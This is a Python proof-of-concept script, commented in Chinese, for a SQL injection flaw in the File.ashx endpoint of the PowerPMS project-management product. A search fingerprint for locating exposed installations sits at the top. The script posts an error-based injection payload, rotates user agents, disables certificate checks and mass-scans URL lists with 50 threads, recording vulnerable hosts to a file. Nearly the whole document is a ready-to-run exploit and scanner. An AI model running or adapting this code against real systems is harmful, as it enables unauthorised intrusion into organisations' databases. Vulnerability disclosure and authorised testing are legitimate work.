# 普华科技-PowerPMS File.ashx接口存在SQL注入漏洞
# app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"

import argparse,json,requests,sys,random
from multiprocessing.dummy import Pool   #多线程库
import urllib3

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    pass
def poc(target):
    user_agent = random.choice(user_agents)
    payload= "/PowerPlat/Control/File.ashx"
    headers1 = {
    "User-Agent": user_agent
}
    #目标主机拒绝连接，程序后续会停止，添加try
    try:
        res1 = requests.get(url=target,headers=headers1,timeout=5,verify=False)
        if res1.status_code == 200:
            headers2 = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
            data = """NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid=1' and 1<@@VERSION--&_type=ftp&action=topdf&sessionid=1"""
            res2 = requests.post(url=target+payload,headers=headers2,data=data,timeout=5,verify=False)
            result = """"detail":null,"list":null,"msgList":null"""
            if result in res2.text:
                print(f"[+]{target}存在sql注入漏洞!")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        print(f"[-]{target}请求错误")



def main():
    banner()

    #第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description = "普华科技-PowerPMS File.ashx接口存在SQL注入漏洞")

    #添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    #实例化
    args = parse.parse_args()

    #对用户的输入做判断，url还是文件
    if args.url and not args.file:
        #开始测试
        poc(args.url)
    elif args.file and not args.url:
        #开始读取文件并逐个测试
        url_list = []
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        #多线程
        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        print("[*] 所有URL测试完成")
    else:
        print(f"usage:Python{sys.argv[0]}-h")

#设置程序的入口

if __name__ == "__main__":
    main()
